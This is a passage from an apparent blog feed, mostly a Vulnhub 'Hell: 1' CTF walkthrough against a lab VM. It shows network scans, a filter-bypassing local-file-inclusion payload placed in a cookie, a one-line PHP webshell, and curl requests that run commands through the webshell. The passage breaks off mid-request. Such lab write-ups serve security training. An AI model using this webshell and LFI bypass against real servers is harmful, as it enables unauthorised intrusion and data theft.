<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cat proof.txt  
</span><span class='line'>adf11c7a9e6523e630aaf3b9b7acb51d
</span><span class='line'>
</span><span class='line'>It seems that you have pwned the box, congrats. 
</span><span class='line'>Now you done that I wanna talk with you. Write a walk & mail at
</span><span class='line'>xly0n@sigaint.org attach the walk and proof.txt
</span><span class='line'>If sigaint.org is down you may mail at nbsly0n@gmail.com
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>USE THIS PGP PUBLIC KEY
</span><span class='line'>
</span><span class='line'>-----BEGIN PGP PUBLIC KEY BLOCK-----
</span><span class='line'>Version: BCPG C# v1.6.1.0
</span><span class='line'>
</span><span class='line'>mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
</span><span class='line'>Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
</span><span class='line'>e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
</span><span class='line'>Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
</span><span class='line'>+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
</span><span class='line'>YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
</span><span class='line'>Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
</span><span class='line'>HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
</span><span class='line'>m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
</span><span class='line'>XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
</span><span class='line'>kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
</span><span class='line'>TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
</span><span class='line'>Gms=
</span><span class='line'>=PiAQ
</span><span class='line'>-----END PGP PUBLIC KEY BLOCK-----</span></code></pre></td></tr></table></div></figure>


<p>Done and cheers Ly0n!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Hell: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/07/17/vulnhub-hell-1/"/>
    <updated>2015-07-17T00:01:30-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/07/17/vulnhub-hell-1</id>
    <content type="html"><![CDATA[<p>&ldquo;This VM is designed to try and entertain the more advanced information security enthusiast. This doesn&rsquo;t exclude beginners however and I&rsquo;m sure that a few of you could meet the challenge. There is no &lsquo;one&rsquo; focus on the machine, a range of skills such as web exploitation, password cracking, exploit development, binary examination and most of all logical thinking is required to crack the box in the intended way - but who knows there might be some short cuts!</p>

<p>A few of the skills needed can be seen in some posts on <a href="http://netsec.ws.">http://netsec.ws.</a> Otherwise enjoy the experience - remember that although vulnerabilities might not jump out at you straight away you may need to try some variations on the normal to get past the protections in place!&ldquo; &ndash; <font color="green">Peleus</font> (<a href="http://netsec.ws/">http://netsec.ws/</a>)</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/hell-1,95/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: Hell (<em>10.10.10.146/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Local File Include vulnerability existed in one of cookie variable</li>
<li>File upload function without any content filter will save any evil code into pre-defined file &lsquo;note.txt&rsquo; under folder &lsquo;/tmp/&rsquo;</li>
<li>Sensitive information found in &lsquo;login.php&rsquo; which disclose jack&rsquo;s SSH password and Database password</li>
<li>Use jack&rsquo;s PGP private key file to unlock the encrypted email file and found SSH password for another account &lsquo;milk_4_life&rsquo;</li>
<li>&lsquo;game&rsquo; program has sticky bit set and will call another program &lsquo;chmod&rsquo; when user win the game, but it has not been using absolute path for &lsquo;chmod&rsquo;</li>
<li>&lsquo;Rockyou&rsquo; dictionary based brute force attacking and cracked the password for &lsquo;Truecrypt&rsquo; container file found in george&rsquo;s home folder, found SSH private key file for another account &lsquo;bazza&rsquo;</li>
<li>Very similar vulnerability as in &lsquo;game&rsquo; happened in another program &lsquo;part2&rsquo; which can be expolited to privilege escape to &lsquo;oj&rsquo;</li>
<li>&lsquo;echo&rsquo; program has Format String vulnerability which should be able to be exploited to get ROOT</li>
<li>&lsquo;Truecrypt&rsquo; has vulnerability which can make attacker to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>, <font color="FF8000">burp proxy</font>]</li>
<li>brute fuzz to find hidden files and paths [<font color="FF8000">wfuzz</font>]</li>
<li>Local file including vulnerability detect and exploit [<font color="FF8000">curl</font>]</li>
<li>Truecrypt password brute force attacking [<font color="FF8000">truecrack</font>]</li>
<li>Analysis and write script to win &lsquo;game&rsquo; program [<font color="FF8000">python</font>]</li>
<li>Poked around in the file system and found sensitive information</li>
<li>Hijack executable program to get privilege escalation</li>
<li>Make evil truecrypt file to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="http://www.edge-security.com/wfuzz.php">wfuzz</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burpsuite</a></li>
<li><a href="http://curl.haxx.se/">curl</a></li>
<li><a href="https://code.google.com/p/truecrack/">truecrack</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>netdiscover</code> as routine to detect the target&rsquo;s IP address (10.10.10.146 in this case).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netdiscover -r 10.10.10.0/24
</span><span class='line'>
</span><span class='line'> Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                               
</span><span class='line'>                                                                                                                                                             
</span><span class='line'> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                             
</span><span class='line'> _____________________________________________________________________________
</span><span class='line'>   IP            At MAC Address      Count  Len   MAC Vendor                   
</span><span class='line'> ----------------------------------------------------------------------------- 
</span><span class='line'> 10.10.10.1      00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                               
</span><span class='line'> 10.10.10.2      00:50:56:e2:f9:10    01    060   VMWare, Inc.                                                                                               
</span><span class='line'> 10.10.10.146    00:0c:29:e2:78:6f    01    060   VMware, Inc.                                                                                               
</span><span class='line'> 10.10.10.254    00:50:56:fb:67:d4    01    060   VMWare, Inc.</span></code></pre></td></tr></table></div></figure>


<p>10.10.10.146 is our Target!</p>

<p>Next, run <code>nmap</code> to scan open services on the target.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -sV -O -A -p- -T5 10.10.10.146
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-13 08:24 EDT
</span><span class='line'>Nmap scan report for 10-10-10-146.tpgi.com.au (10.10.10.146)
</span><span class='line'>Host is up (0.00044s latency).
</span><span class='line'>Not shown: 65529 closed ports
</span><span class='line'>PORT      STATE    SERVICE VERSION
</span><span class='line'>22/tcp    open     ssh     OpenSSH 6.0p1 Debian 4+deb7u1 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 f4:bb:f4:22:36:08:61:ef:74:2c:27:e0:b4:a2:69:d3 (DSA)
</span><span class='line'>|   2048 0e:31:1d:cf:04:d0:63:fa:5c:76:f2:dc:22:1c:f1:7c (RSA)
</span><span class='line'>|_  256 e0:b0:ba:37:93:39:65:33:c6:44:99:50:2c:1b:f6:fa (ECDSA)
</span><span class='line'>80/tcp    open     http    Apache httpd 2.2.22 ((Debian))
</span><span class='line'>|_http-methods: GET HEAD POST OPTIONS
</span><span class='line'>| http-robots.txt: 2 disallowed entries 
</span><span class='line'>|_/personal/ /super_secret_login_path_muhahaha/
</span><span class='line'>|_http-title: Have fun!
</span><span class='line'>111/tcp   open     rpcbind 2-4 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100024  1          44490/tcp  status
</span><span class='line'>|_  100024  1          52715/udp  status
</span><span class='line'>666/tcp   open     doom?
</span><span class='line'>1337/tcp  filtered waste
</span><span class='line'>44490/tcp open     status  1 (RPC #100024)
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>ports 22 and 80 open, and two very interesting folders found on port 80: <code>\personal</code> and <code>\super_secret_login_path_muhahaha\</code>. Then using <code>wfuzz</code> to reveal more possible hidden folders and files:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# wfuzz -c --hc 404 -z file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt http://10.10.10.146/super_secret_login_path_muhahaha/FUZZ.php
</span><span class='line'>
</span><span class='line'>********************************************************
</span><span class='line'>* Wfuzz  2.0 - The Web Bruteforcer                     *
</span><span class='line'>********************************************************
</span><span class='line'>
</span><span class='line'>Target: http://10.10.10.146/super_secret_login_path_muhahaha/FUZZ.php
</span><span class='line'>Payload type: file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
</span><span class='line'>
</span><span class='line'>Total requests: 81643
</span><span class='line'>==================================================================
</span><span class='line'>ID    Response   Lines      Word         Chars          Request    
</span><span class='line'>==================================================================
</span><span class='line'>
</span><span class='line'>00001:  C=200     17 L          33 W      371 Ch    " - #"
</span><span class='line'>00002:  C=200     17 L          33 W      371 Ch    " - # directory-list-lowercase-2.3-small.txt"
</span><span class='line'>00003:  C=200     17 L          33 W      371 Ch    " - # Copyright 2007 James Fisher"
</span><span class='line'>00004:  C=200     17 L          33 W      371 Ch    "on-Share Alike 3.0 License. To view a copy of this"
</span><span class='line'>00005:  C=200     17 L          33 W      371 Ch    "# This work is licensed under the Creative Commons"
</span><span class='line'>00006:  C=200     17 L          33 W      371 Ch    "sit http://creativecommons.org/licenses/by-sa/3.0/"
</span><span class='line'>00007:  C=200     17 L          33 W      371 Ch    " - #"
</span><span class='line'>00008:  C=200     17 L          33 W      371 Ch    " - #"
</span><span class='line'>00009:  C=200     17 L          33 W      371 Ch    " Suite 300, San Francisco, California, 94105, USA."
</span><span class='line'>00010:  C=200     17 L          33 W      371 Ch    "ed case insensative list, where entries were found"
</span><span class='line'>00011:  C=200     17 L          33 W      371 Ch    " - # on atleast 3 different hosts"
</span><span class='line'>00012:  C=200     17 L          33 W      371 Ch    "d a letter to Creative Commons, 171 Second Street,"
</span><span class='line'>00016:  C=403     10 L          30 W      317 Ch    " - "
</span><span class='line'>00017:  C=200     17 L          33 W      371 Ch    " - index"
</span><span class='line'>00028:  C=200     17 L          33 W      371 Ch    " - #"
</span><span class='line'>00063:  C=302      0 L           0 W        0 Ch    " - login"
</span><span class='line'>00193:  C=200      5 L          19 W      163 Ch    " - mail"
</span><span class='line'>00198:  C=200      2 L           2 W       19 Ch    " - users"
</span><span class='line'>00470:  C=302     17 L          35 W      387 Ch    " - personal"
</span><span class='line'>00572:  C=200      7 L          21 W      170 Ch    " - server"
</span><span class='line'>01051:  C=200      5 L          20 W      179 Ch    " - notes"
</span><span class='line'>01255:  C=302      1 L           0 W        2 Ch    " - check"
</span><span class='line'>05186:  C=302     21 L          38 W      566 Ch    " - panel"
</span><span class='line'>Stopping...</span></code></pre></td></tr></table></div></figure>


<p>After I checked those revealed files, I found three interesting ones: <code>1.php</code>, <code>check.php</code> and <code>notes.php</code>.</p>

<p>Having a look at <code>1.php</code>, there is only one sentence: <font color="red">INTRUDER ALERT!</font> which is in Red color and all Capital.</p>

<p>By playing <code>check.php</code> with Burp proxy, I noticed that if user input wrong username/password, the cookie variable <code>failcount</code> will increase. However when input the wrong username/password more than 3 times, a new cookie <code>intruder</code> will be added and the value is always 1.</p>

<p>Also the <code>check.php</code> will request <code>personal.php</code> and <code>panel.php</code> as well, something noticeable in <code>panel.php</code> is that the red color alert: <font color="red">INTRUDER ALERT!</font> which is same as the content of <code>1.php</code>.</p>

<p>So based on the above facts and analysis, I could guess that the <code>panel.php</code> has included the <code>1.php</code> when user input wrong username/password over 3 times. As a result, I firstly modified the cookie value of <code>intruder</code> to <code>../../../../etc/passwd</code> but the respond is not excepted&hellip; might be the admin set a filter here or something like that. After I read the page in OWASP testing <a href="https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)">guide</a>, I finally found a well-working payload: <code>....//....//....//....//....//....//etc//passwd</code>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Hell1/1.png"></p>

<p>Here is a Local File Include vulnerability found.</p>

<p>Now it&rsquo;s time to move to <code>notes.php</code>.</p>

<p>Taking a close look at notes.php, I noticed that we can write anything and it will be saved in temporary folder(mostly possible is /tmp/ in Linux) as the name is <code>note.txt</code>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Hell1/2.png"></p>

<p>After some trying, it is proved that the <code>note.txt</code> file is saved in <code>/tmp/</code> folder.</p>

<p>Then I wrote one-line PHP webshell to note.txt, then use File Include vulnerability found previously to include the webshell.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Hell1/3.png"></p>

<p>Now I have already got a webshell and can run system command which is ready to poke around on the server file system.</p>

<p>In order to make the life easier, I use <code>curl</code> instead of burp proxy to interactive with target server.</p>

<p>First to request <code>check.php</code>, we can see that cookies <code>PHPSESSID</code> and <code>failcount</code> have been set.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl -v -L http://10.10.10.146/super_secret_login_path_muhahaha/check.php -c cookies -b cookies
</span><span class='line'>* About to connect() to 10.10.10.146 port 80 (#0)
</span><span class='line'>*   Trying 10.10.10.146...
</span><span class='line'>* connected
</span><span class='line'>* Connected to 10.10.10.146 (10.10.10.146) port 80 (#0)
</span><span class='line'>&gt; GET /super_secret_login_path_muhahaha/check.php HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: 10.10.10.146
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt;
</span><span class='line'>* additional stuff not fine transfer.c:1037: 0 0
</span><span class='line'>* HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'><span class="nt">&lt; HTTP</span><span class="err">/</span><span class="na">1</span><span class="err">.</span><span class="na">1</span> <span class="na">302</span> <span class="na">Found</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Date:</span> <span class="na">Wed</span><span class="err">,</span> <span class="na">15</span> <span class="na">Jul</span> <span class="na">2015</span> <span class="na">00:06:37</span> <span class="na">GMT</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Server:</span> <span class="na">Apache</span><span class="err">/</span><span class="na">2</span><span class="err">.</span><span class="na">2</span><span class="err">.</span><span class="na">22</span> <span class="err">(</span><span class="na">Debian</span><span class="err">)</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">X-Powered-By:</span> <span class="na">PHP</span><span class="err">/</span><span class="na">5</span><span class="err">.</span><span class="na">4</span><span class="err">.</span><span class="na">4-14</span><span class="err">+</span><span class="na">deb7u11</span>
</span><span class='line'><span class="err">*</span> <span class="na">Added</span> <span class="na">cookie</span> <span class="na">PHPSESSID=</span><span class="s">&quot;cb11eurq57no9kbu8k09pvt0d5&quot;</span> <span class="na">for</span> <span class="na">domain</span> <span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">146</span><span class="err">,</span> <span class="na">path</span> <span class="err">/,</span> <span class="na">expire</span> <span class="na">0</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Set-Cookie:</span> <span class="na">PHPSESSID=</span><span class="s">cb11eurq57no9kbu8k09pvt0d5;</span> <span class="na">path=</span><span class="s">/</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Expires:</span> <span class="na">Thu</span><span class="err">,</span> <span class="na">19</span> <span class="na">Nov</span> <span class="na">1981</span> <span class="na">08:52:00</span> <span class="na">GMT</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Cache-Control:</span> <span class="na">no-store</span><span class="err">,</span> <span class="na">no-cache</span><span class="err">,</span> <span class="na">must-revalidate</span><span class="err">,</span> <span class="na">post-check=</span><span class="s">0,</span> <span class="na">pre-check=</span><span class="s">0</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Pragma:</span> <span class="na">no-cache</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Location:</span> <span class="na">personal</span><span class="err">.</span><span class="na">php</span>
</span><span class='line'><span class="err">*</span> <span class="na">Added</span> <span class="na">cookie</span> <span class="na">failcount=</span><span class="s">&quot;1&quot;</span> <span class="na">for</span> <span class="na">domain</span> <span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">146</span><span class="err">,</span> <span class="na">path</span> <span class="err">/</span><span class="na">super_secret_login_path_muhahaha</span><span class="err">/,</span> <span class="na">expire</span> <span class="na">0</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Set-Cookie:</span> <span class="na">failcount=</span><span class="s">1</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Vary:</span> <span class="na">Accept-Encoding</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Content-Length:</span> <span class="na">2</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Content-Type:</span> <span class="na">text</span><span class="err">/</span><span class="na">html</span>
</span><span class='line'><span class="err">&lt;</span>
</span><span class='line'><span class="err">*</span> <span class="na">Ignoring</span> <span class="na">the</span> <span class="na">response-body</span>
</span><span class='line'><span class="err">*</span> <span class="na">Connection</span> <span class="err">#</span><span class="na">0</span> <span class="na">to</span> <span class="na">host</span> <span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">146</span> <span class="na">left</span> <span class="na">intact</span>
</span><span class='line'><span class="err">*</span> <span class="na">Issue</span> <span class="na">another</span> <span class="na">request</span> <span class="na">to</span> <span class="na">this</span> <span class="na">URL:</span> <span class="err">&#39;</span><span class="na">http:</span><span class="err">//</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">146</span><span class="err">/</span><span class="na">super_secret_login_path_muhahaha</span><span class="err">/</span><span class="na">personal</span><span class="err">.</span><span class="na">php</span><span class="err">&#39;</span>
</span><span class='line'><span class="err">*</span> <span class="na">Re-using</span> <span class="na">existing</span> <span class="na">connection</span><span class="err">!</span> <span class="err">(#</span><span class="na">0</span><span class="err">)</span> <span class="na">with</span> <span class="na">host</span> <span class="err">(</span><span class="na">nil</span><span class="err">)</span>
</span><span class='line'><span class="err">*</span> <span class="na">Connected</span> <span class="na">to</span> <span class="err">(</span><span class="na">nil</span><span class="err">)</span> <span class="err">(</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">10</span><span class="err">.</span><span class="na">146</span><span class="err">)</span> <span class="na">port</span> <span class="na">80</span> <span class="err">(#</span><span class="na">0</span><span class="err">)</span>
</span><span class='line'><span class="nt">&gt;</span> GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: 10.10.10.146
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt; Cookie: failcount=1; PHPSESSID=cb11eurq57no9kbu8k09pvt0d5
</span><span class='line'>&gt;
</span><span class='line'>
</span><span class='line'>root@kali:~/hell# cat cookies
</span><span class='line'># Netscape HTTP Cookie File
</span><span class='line'># http://curl.haxx.se/rfc/cookie_spec.html
</span><span class='line'># This file was generated by libcurl! Edit at your own risk.
</span><span class='line'>
</span><span class='line'>10.10.10.146  FALSE   /   FALSE   0   PHPSESSID   cb11eurq57no9kbu8k09pvt0d5
</span><span class='line'>10.10.10.146  FALSE   /super_secret_login_path_muhahaha/  FALSE   0   failcount   1
</span></code></pre></td></tr></table></div></figure>


<p>New cookie &ldquo;intruder&rdquo; has been set after running the same command 3 times.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/hell# cat cookies 
</span><span class='line'># Netscape HTTP Cookie File
</span><span class='line'># http://curl.haxx.se/rfc/cookie_spec.html
</span><span class='line'># This file was generated by libcurl! Edit at your own risk.
</span><span class='line'>
</span><span class='line'>10.10.10.146  FALSE   /   FALSE   0   PHPSESSID   cb11eurq57no9kbu8k09pvt0d5
</span><span class='line'>10.10.10.146  FALSE   /super_secret_login_path_muhahaha/  FALSE   0   failcount   3
</span><span class='line'>10.10.10.146  FALSE   /super_secret_login_path_muhahaha/  FALSE   0   intruder    1</span></code></pre></td></tr></table></div></figure>


<p>Then I change the value of cookie <code>intruder</code> to include our webshell file: <code>/tmp/note.txt</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# cat cookies
</span><span class='line'># Netscape HTTP Cookie File
</span><span class='line'># http://curl.haxx.se/rfc/cookie_spec.html
</span><span class='line'># This file was generated by libcurl! Edit at your own risk.
</span><span class='line'>
</span><span class='line'>10.10.10.146  FALSE   /   FALSE   0   PHPSESSID   cb11eurq57no9kbu8k09pvt0d5
</span><span class='line'>10.10.10.146  FALSE   /super_secret_login_path_muhahaha/  FALSE   0   failcount   3
</span><span class='line'>10.10.10.146  FALSE   /super_secret_login_path_muhahaha/  FALSE   0   intruder    ....//....//....//....//....//....//tmp//note.txt
</span><span class='line'>root@kali:~/hell# curl -v http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=id -c cookies -b cookies
</span><span class='line'>* About to connect() to 10.10.10.146 port 80 (#0)
</span><span class='line'>*   Trying 10.10.10.146...
</span><span class='line'>* connected
</span><span class='line'>* Connected to 10.10.10.146 (10.10.10.146) port 80 (#0)
